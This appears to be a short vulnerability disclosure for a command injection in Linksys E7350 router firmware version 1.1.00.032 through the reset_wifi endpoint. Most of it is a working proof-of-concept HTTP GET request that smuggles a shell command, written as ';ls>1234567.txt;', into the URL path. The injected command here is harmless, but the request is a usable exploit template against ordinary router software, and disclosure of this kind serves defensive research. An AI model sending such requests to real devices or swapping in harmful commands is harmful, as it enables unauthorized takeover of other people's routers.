# Linksys E7350 Ver.1.1.00.032 Command Injection (reset_wifi)
...
We can trigger this vulnerability by injecting the `ls>1234567.txt` command using the following payload.

```http
GET /cgi-bin/luci/admin/mtk/wifi/reset/;ls>1234567.txt; HTTP/1.1
